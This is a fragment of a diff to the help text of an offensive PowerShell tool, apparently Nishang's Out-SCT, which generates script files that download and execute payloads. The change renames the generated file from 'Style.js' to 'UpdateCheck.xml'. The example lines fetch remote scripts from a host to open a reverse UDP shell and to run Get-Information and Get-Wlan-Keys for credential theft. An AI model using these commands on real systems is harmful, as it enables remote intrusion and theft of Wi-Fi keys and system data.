@@ -28,7 +28,7 @@ Path to the directory where the files would be saved. Default is the current dir
 PS > Out-SCT -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
 Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
-named "Style.js" would be generated in the current directory.
+named "UpdateCheck.xml" would be generated in the current directory.
 
 
 PS > Out-SCT -PayloadURL http://192.168.230.1/Powerpreter.psm1 -Arguments "Get-Information;Get-Wlan-Keys"
